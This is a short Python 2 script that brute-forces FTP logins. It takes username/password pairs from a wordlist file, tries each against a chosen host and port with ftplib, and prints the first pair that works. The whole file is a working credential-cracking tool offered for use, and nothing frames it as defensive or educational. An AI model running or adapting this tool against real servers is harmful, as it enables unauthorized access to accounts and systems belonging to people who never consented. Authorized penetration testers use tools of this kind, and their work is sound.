#encoding: utf-8
import os
import sys
import argparse
import ftplib

def login(host, port, user, password):
    try:
        _client = ftplib.FTP()
        _client.connect(host, port)
        _client.login(user, password)
        _client.close()
        return True
    except BaseException as e:
        return False

def crack(host, port, wordbook):
    fhandler = open(wordbook, 'rb')
    for _line in fhandler:
        try:
            _user, _password = _line.split()[:2]
            if login(host, port, _user, _password):
                print '[+] username:%s, password:%s' % (_user, _password)
                break
        except BaseException as e:
            print '[-] login error, %s' % _line

    fhandler.close()


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument('-T', '--target', help='crack host', \
                            default='localhost', type=str)
    _parser.add_argument('-P', '--port', help='crack port', \
                            default=21, type=int)
    _parser.add_argument('-W', '--wordbook', help='user & password wordbook', \
                            type=str)

    _args = _parser.parse_args()
    if _args.wordbook is None or \
        not os.path.exists(_args.wordbook) or \
        not os.path.isfile(_args.wordbook):
        _parser.print_help()
        sys.exit(-1)

    crack(_args.target, _args.port, _args.wordbook)
